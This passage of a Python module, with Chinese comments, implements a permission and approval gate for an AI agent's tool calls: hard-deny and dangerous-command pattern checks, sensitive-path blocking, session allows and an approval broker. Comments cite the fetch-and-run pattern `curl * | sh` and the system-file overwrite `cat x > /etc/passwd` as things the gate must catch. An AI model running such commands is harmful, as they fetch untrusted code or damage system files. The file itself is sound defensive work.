        # 审批落盘记录：tool_call_id → approval 字段（agent_loop 挂到 tool 行）
        self._approval_records: dict[str, dict] = {}
        self._lock = threading.Lock()

    # ── 接线（Agent / SessionRuntime 注入）──────────────────────────
    def attach_tool_registry(self, registry) -> None:
        """把额外目录集共享给 ToolRegistry（safe_path 兜底层，见 §3.3）。"""
        registry.set_extra_dirs(self._extra_dirs)

    def attach_broker(self, broker) -> None:
        self.approval_broker = broker

    def set_stop_event(self, evt) -> None:
        self._stop_event = evt

    def set_save_allows_callback(self, cb) -> None:
        self._save_allows_cb = cb

    # ── 状态恢复与切换 ─────────────────────────────────────────────
    def restore_from_meta(self, meta: dict | None, project_mode: str | None = None) -> None:
        """init_session / switch_session 时按继承链恢复（文档 §2.2）：

        会话 meta 无记录（存量会话/新建）→ 工作空间 projects.json 的
        permission_mode → permissions.json 的 default_mode（缺省 default）。
        session_allows 一并恢复，path 类记忆重建进额外目录集。
        """
        meta = meta if isinstance(meta, dict) else {}
        mode = meta.get("permission_mode")
        if mode not in VALID_MODES:
            mode = project_mode
        if mode not in VALID_MODES:
            mode = self.store.default_mode
        with self._lock:
            self.mode = mode
            allows = meta.get("session_allows")
            self.session_allows = [
                dict(a) for a in (allows if isinstance(allows, list) else [])
                if isinstance(a, dict) and a.get("type") and a.get("value")
            ]
            self._rebuild_extra_dirs_locked()

    def set_mode(self, mode: str) -> None:
        """运行时切换（只影响后续判定，不重判在途审批 —— E6）。"""
        if mode not in VALID_MODES:
            return
        with self._lock:
            self.mode = mode

    def _rebuild_extra_dirs_locked(self) -> None:
        """重建额外目录集：worktree + 全局额外目录 + path 类会话记忆（持锁调用）。"""
        dirs: set[Path] = {Path(WORKTREE_DIR).resolve()}
        for d in self.store.load()["additional_dirs"]:
            try:
                dirs.add(Path(d).expanduser().resolve())
            except OSError:
                continue
        for a in self.session_allows:
            if a.get("type") == "path":
                try:
                    dirs.add(Path(str(a.get("value"))).expanduser().resolve())
                except OSError:
                    continue
        # 红线：必须**原地** clear + update，禁止写成 `self._extra_dirs = {...}` 重新赋值
        # —— 这个 set 与 ToolRegistry.safe_path 的兜底层是**同一个对象**
        # （attach_tool_registry 时共享）。换对象 = 共享断裂：判定层放行了、工具层仍按
        # 旧集拦下，表现为「审批通过但工具报 ValueError」，且极难排查。
        self._extra_dirs.clear()
        self._extra_dirs.update(dirs)

    def refresh_extra_dirs(self) -> None:
        """重读 permissions.json 的 additional_dirs 并重建额外目录集。

        设置页保存全局额外目录后，由桥层对每个**在途**会话调用 —— 其余配置项靠
        `evaluate()` 每轮 `store.load()` 的 mtime 热加载已自动生效，**只有这个是缓存**
        （`_extra_dirs` 原本只在 `restore_from_meta` / `record_session_allow` 时重建）。
        未构造 agent 的会话不用管：首次构造时 `restore_from_meta` 自然读到新值。

        `session_allows` 的 path 类记忆在 `_rebuild_extra_dirs_locked` 内一并重建
        （所以刷新不会丢掉本会话已批准的目录）。
        """
        with self._lock:
            self._rebuild_extra_dirs_locked()

    # ── 会话记忆 ───────────────────────────────────────────────────
    def record_session_allow(self, session_key: dict, source: str = "approval") -> None:
        """记录一条「会话内允许」（内存即时生效 + 尽力持久化到会话 meta）。

        持久化失败仅告警（E7 降级：本进程内仍允许；重启后丢记忆可接受）。
        """
        key_type = str((session_key or {}).get("type") or "")
        value = str((session_key or {}).get("value") or "")
        if not key_type or not value:
            return
        with self._lock:
            if any(a.get("type") == key_type and a.get("value") == value
                   for a in self.session_allows):
                return  # 幂等：同粒度记忆已存在
            self.session_allows.append({
                "type": key_type, "value": value,
                "at": datetime.now().isoformat(timespec="seconds"),
                "source": source,
            })
            if key_type == "path":
                try:
                    self._extra_dirs.add(Path(value).expanduser().resolve())
                except OSError:
                    pass
            allows_snapshot = [dict(a) for a in self.session_allows]
        cb = self._save_allows_cb
        if cb is not None:
            try:
                cb(allows_snapshot)
            except Exception as e:  # noqa: BLE001 - E7：内存已生效，落盘失败只告警
                log.warning("session_allows 写入会话元数据失败（本进程内仍生效）: %s", e)

    def _session_allows_match(self, key_type: str, value: str) -> bool:
        with self._lock:
            return any(a.get("type") == key_type and a.get("value") == value
                       for a in self.session_allows)

    # ── 审批落盘记录（agent_loop 挂到 tool 行的 approval 字段）────────
    def note_approval_record(self, tool_call_id: str, record: dict) -> None:
        if not tool_call_id:
            return
        with self._lock:
            self._approval_records[str(tool_call_id)] = record

    def pop_approval_record(self, tool_call_id: str) -> dict | None:
        with self._lock:
            return self._approval_records.pop(str(tool_call_id), None)

    # ═════════════════════════════════════════════════════════════
    #  八步判定链（纯判定，无阻塞）
    # ═════════════════════════════════════════════════════════════
    def evaluate(self, tool_name: str, tool_args, mcp_lookup=None) -> Decision:
        store = self.store.load()

        # ① 解析失败 → deny（fail-closed）
        if not isinstance(tool_args, dict):
            return _deny("工具参数缺失或不是对象（fail-closed）")

        # ② 硬拒绝（任何模式不可越；含敏感路径）
        if tool_name == "bash":
            decision = self._bash_hard_deny(tool_args, store)
            if decision is not None:
                return decision
        elif tool_name in FILE_TOOLS:
            target = self._resolve_target(tool_args.get("path"))
            if target is not None:
                hit = deny_path_hit(target)
                if hit:
                    return _deny(f"目标路径属于敏感路径（{hit}），任何模式下均拒绝访问")

        # ③ 完全访问 → allow（唯一例外：MCP 破坏性工具且配置为仍询问）
        if self.mode == MODE_FULL_ACCESS:
            is_mcp_destructive = (
                tool_name.startswith("mcp__")
                and mcp_lookup is not None
                and bool(mcp_lookup(tool_name))
                and store["mcp_destructive"] == "ask"
            )
            if not is_mcp_destructive:
                return _allow()

        # ④ 预授权目录（文件工具目标在有效目录集内 → allow）
        if tool_name in FILE_TOOLS:
            target = self._resolve_target(tool_args.get("path"))
            if target is not None and self._in_effective_dirs(target):
                return _allow()

        # ⑤ 自定义允许规则 —— **已下线（2026-09-22）**。原 `rules` 里 deny 本就并
        # 在②生效，allow / ask 也已迁移进 ⑦a 白名单 / ⑦b 危险清单，故此步不再
        # 判定。编号保留不重排，便于与既有文档、记录对照。

        # ⑥ 会话内允许（文件工具的 path 类记忆已在④生效；这里管 bash / MCP）
        if tool_name.startswith("mcp__"):
            if self._session_allows_match("mcp_tool", tool_name):
                return _allow()

        # ⑦ 类别规则（按 §2.1 矩阵分派）
        if tool_name == "bash":
            return self._bash_category_decision(tool_args, store)
        if tool_name in FILE_TOOLS:
            target = self._resolve_target(tool_args.get("path"))
            if target is None:
                return _allow()  # 路径为空/不可解析 → 交给工具层报错
            key = {"type": "path", "value": str(target.parent)}
            return _approve(
                "outside_workspace",
                f"工作空间与额外目录外路径：{target}",
                key, segment=str(target),
            )
        if tool_name.startswith("mcp__"):
            destructive = bool(mcp_lookup and mcp_lookup(tool_name))
            if destructive:
                return _approve(
                    "mcp_destructive",
                    f"MCP 破坏性工具（destructiveHint）：{tool_name}",
                    {"type": "mcp_tool", "value": tool_name},
                )
            return _allow()
        # 其余工具（任务/技能/记忆/后台/cron/workflow/ask_user/sub_agent…）
        # 与工作区外无文件语义 → 放行（文档 §2.1 矩阵「非敏感工具」行）
        return _allow()

    # ── ② bash 硬拒绝 ─────────────────────────────────────────────
    def _bash_hard_deny(self, tool_args: dict, store: dict) -> Decision | None:
        command = str(tool_args.get("command") or "")
        segments = split_command_segments(command)
        token_lists = [tokenize(s) for s in segments]
        deny_patterns = BUILTIN_DENY + list(store["deny_patterns"])
        for seg in segments:
            for pattern in deny_patterns:
                # 跨段模式（`curl * | sh`）必须一并匹配：`pattern_matches` 对含 `|`
                # 的模式恒返回 False，此前只判它 → 用户配在硬拒绝里的跨段模式
                # **完全不生效**（2026-09-22 修复，口径与 ⑦b 危险模式对齐）。
                if (pattern_matches(pattern, seg)
                        or cross_pattern_matches(pattern, token_lists)):
                    return _deny(f"命令命中硬拒绝清单（{pattern}），任何模式下均不允许执行")
        hit = deny_tokens_in_command(command)
        if hit:
            return _deny(f"命令涉及敏感路径（{hit}），任何模式下均不允许访问")
        return None

    # ── ⑦ bash 类别规则 ────────────────────────────────────────────
    def _bash_category_decision(self, tool_args: dict, store: dict) -> Decision:
        command = str(tool_args.get("command") or "")
        segments = split_command_segments(command)
        if not segments:
            return _allow()  # 空命令 → 交给工具层报错
        token_lists = [tokenize(s) for s in segments]
        dangerous = BUILTIN_DANGEROUS + list(store["dangerous_patterns"])
        safe_cfg = store["safe_commands"]
        safe_list = safe_cfg["list"] if safe_cfg["enabled"] else []
        head_of = {}

        unsafe_head = ""
        unsafe_seg = ""
        for seg, toks in zip(segments, token_lists):
            # ⑥ 会话记忆：bash_prefix（cmd_head 相等）/ pattern（同一模式再次命中）
            head = cmd_head(seg)
            head_of[seg] = head
            if self._session_allows_match("bash_prefix", head):
                continue
            if any(self._session_allows_match("pattern", p) and pattern_matches(p, seg)
                   for p in dangerous):
                continue
            # ⑦-1 危险模式 —— **必须先于白名单判定**（顺序即安全语义，见模块 docstring）：
            #   ① 白名单命中即 `continue` 会跳过本段剩余检查，`cat x > /etc/passwd` 这类
            #      「白名单只读命令 + 重定向」此前因此被**静默放行**；
            #   ② 先判危险才能让「白名单写大类 + 危险写特例」成立（白名单 git 免问、
            #      危险 git push 仍过问）。更严的层先判 = 冲突时更严的一方赢。
            for p in dangerous:
                if pattern_matches(p, seg) or cross_pattern_matches(p, token_lists):
                    return _approve(
                        "dangerous_pattern", f"危险命令模式：{p}",
                        {"type": "pattern", "value": p}, segment=seg,
                    )
            # ⑦-2 安全白名单（只读命令；**逐段**放行，其余片段继续判定）
            if safe_list and any(pattern_matches(p, seg) for p in safe_list):
                continue
            # ⑦-3 白名单外普通命令
            if not unsafe_head:
                unsafe_head, unsafe_seg = head, seg
        if unsafe_head:
            return _approve(
                "bash_not_allowed", "未在安全命令白名单内",
                {"type": "bash_prefix", "value": unsafe_head}, segment=unsafe_seg,
            )
        return _allow()

    # ── 路径工具方法 ───────────────────────────────────────────────
    def _resolve_target(self, raw_path) -> Path | None:
        """文件工具目标路径 → resolve 后的绝对路径；空/异常 → None。"""
        p = str(raw_path or "").strip()
        if not p:
            return None
        try:
            candidate = Path(p)
            if not candidate.is_absolute():
                candidate = self.workdir / candidate
            return candidate.resolve()
        except OSError:
            return None

    def _in_effective_dirs(self, target: Path) -> bool:
        """目标是否在有效目录集内（workdir ∪ 额外目录集）。"""
        try:
            if target.is_relative_to(self.workdir):
                return True
        except (OSError, ValueError):
            pass
        with self._lock:
            extra = list(self._extra_dirs)
        for d in extra:
            try:
                if target.is_relative_to(d):
                    return True
            except (OSError, ValueError):
                continue
        return False

    # ═════════════════════════════════════════════════════════════
    #  审批编排（PreToolUse 唯一入口，由 hooks.permission_hook 委托）
    # ═════════════════════════════════════════════════════════════
    def check_tool_call(self, tool_call, mcp_lookup=None) -> str | None:
        """PreToolUse 钩子主体：判定 → （审批 / 拒绝 / 放行）。

        返回语义与 hooks 契约一致：
            None   → 放行；
            字符串 → 阻断，该字符串作为 tool_result 回填给模型。
        审批决定**不进模型上下文**（范式 C），只有结局文案回填（§4.3）。
        """
        try:
            tool_name = tool_call.function.name
            raw_args = tool_call.function.arguments
            tool_args = json.loads(raw_args) if isinstance(raw_args, str) else raw_args
        except Exception:
            return "Error: Permission denied: 工具参数解析失败"
        tool_call_id = str(getattr(tool_call, "id", "") or "")

        decision = self.evaluate(tool_name, tool_args, mcp_lookup=mcp_lookup)
        if decision.action == "allow":
            return None
        if decision.action == "deny":
            if not self.silent:
                print(f"\033[2;95m⛔ 权限拦截: {decision.reason}\033[0m")
            return f"Error: Permission denied: {decision.reason}"

        # approve → 审批。**判据是「有没有交互通道」，不是 silent**（2026-09-22 修复）。
        #
        # 历史 bug：此处曾以 `if self.silent: 直接拒绝` 短路，本意是"cron/无人值守
        # 不要把 input() 挂死"。但桌面端每一会话的 Agent 也是 `silent=True`
        # （`SessionRuntime.build_agent` —— silent 在 Agent 层只表示"抑制后端
        # stdout 打印"），于是前端审批卡片**永远不弹**：一切待审批操作（rm /
        # python3 / npm install / 工作区外读写 / MCP 破坏性）被静默拒绝，用户
        # 侧表现为"权限被硬拦截、无法删除文件"。
        #
        # 真实区分点是 broker：SessionRuntime 注入 = 有前端可作答；cron / 纯后台 /
        # 复现脚本不注入 = 无人值守 → 自动拒绝（确定性结局，防 input() 挂死）。
        # CLI（agent_cli，silent=False 且无 broker）仍走终端三选一。
        broker = self.approval_broker
        if broker is None:
            if self.silent:
                return "Error: Permission denied (non-interactive session)"
            # CLI 终端兜底：保留三选一的终端产品体验（文档 §6 CLI 行）
            status = self._cli_confirm(tool_name, tool_args, decision)
        else:
            status = broker.request(
                tool_call_id=tool_call_id,
                tool_name=tool_name,
                args=tool_args,
                trigger=decision.trigger,
                reason=decision.reason,
                session_scope_hint=self.session_scope_hint(decision),
                mode=self.mode,
                timeout_seconds=self.store.approval_timeout_seconds,
                stop_event=self._stop_event,
            )

        if status == APPROVE_ALLOW_ONCE:
            # 路径类触发的「允许一次」：父目录加入共享额外目录集（进程内生效、
            # **不持久化**）—— 工具层 safe_path 兜底按目录级授权放行，没有它
            # 本次执行会被二次拦下。与「会话内允许」的差别：不写会话元数据，
            # 重启/切换会话后失效（见 docs/frontend/17 §3.3 兜底层）。
            key = decision.session_key or {}
            if key.get("type") == "path":
                try:
                    self._extra_dirs.add(
                        Path(str(key.get("value"))).expanduser().resolve()
                    )
                except OSError:
                    pass
            return None  # 不写记忆、不落 approval 字段
        if status == APPROVE_ALLOW_SESSION:
            self.record_session_allow(decision.session_key or {})
            return None
        # 拒绝 / 超时 / 停止：结算 + 落盘记录（tool 行 approval 字段）+ 回填文案。
        # decision 用文档 §7 的结局词（denied / timeout / stopped），与
        # approval_resolved.status 同族；broker 返回的 APPROVE_DENY（"deny"）
        # 在此翻译 —— 两个常量族的唯一交汇点，收敛在这一行。
        self.note_approval_record(tool_call_id, {
            "decision": "denied" if status == APPROVE_DENY else status,
            "trigger": decision.trigger,
            "pattern": (decision.session_key or {}).get("value") or decision.reason,
            "mode": self.mode,
            "at": datetime.now().isoformat(timespec="seconds"),
        })
        if status == "timeout":
            return "Error: Permission denied (approval timeout)"
        if status == "stopped":
            return "Error: Permission denied (stopped by user)"
        return "Error: Permission denied by user"

    # ── 前端按钮副文案：点「会话内允许」之前就知道记的是什么账 ──────
    @staticmethod
    def session_scope_hint(decision: Decision) -> str:
        key = decision.session_key or {}
        value = str(key.get("value") or "")
        kind = key.get("type")
        if kind == "bash_prefix":
            return f"将允许以 {value} 开头的命令，直到会话结束"
        if kind == "pattern":
            return f"将允许匹配「{value}」的命令，直到会话结束"
        if kind == "path":
            return f"将允许访问 {value}，直到会话结束"
        if kind == "mcp_tool":
            return f"将允许使用 MCP 工具 {value}，直到会话结束"
        return "将允许同类操作，直到会话结束"

    # ── CLI 终端兜底（无 broker：agent_cli / 复现场景）──────────────
    def _cli_confirm(self, tool_name: str, tool_args: dict, decision: Decision) -> str:
        """终端三选一：[a]允许一次 [s]会话内允许 [N]拒绝。默认拒绝。"""
        print(f"\033[2;95m⚠  权限确认：{decision.reason}\033[0m")
        if tool_name == "bash":
            print(f"\033[2;95m   命令: {tool_args.get('command', '')}\033[0m")
        elif tool_name in FILE_TOOLS:
            print(f"\033[2;95m   路径: {tool_args.get('path', '')}\033[0m")
        else:
            print(f"\033[2;95m   工具: {tool_name}({tool_args})\033[0m")
        print(f"\033[2;95m   {self.session_scope_hint(decision)}\033[0m")
        try:
            choice = input("   允许执行? [a]允许一次 [s]会话内允许 [N]拒绝 ").strip().lower()
        except EOFError:
            return APPROVE_DENY
        if choice in ("a", "allow_once"):
            return APPROVE_ALLOW_ONCE
        if choice in ("s", "allow_session"):
            return APPROVE_ALLOW_SESSION
        return APPROVE_DENY


# ═══════════════════════════════════════════════════════════════════════════
#  模式继承链辅助（新建会话时由调用方组合，见 Agent._restore_permission_state）
# ═══════════════════════════════════════════════════════════════════════════

def resolve_session_mode(session_meta: dict | None, project_mode: str | None,
                         store: PermissionStore) -> str:
    """继承链唯一出口：会话 meta → 工作空间最后更改值 → 全局默认（§2.2）。"""
    meta = session_meta if isinstance(session_meta, dict) else {}
    mode = meta.get("permission_mode")
    if mode in VALID_MODES:
        return mode
    if project_mode in VALID_MODES:
        return project_mode
    return store.default_mode
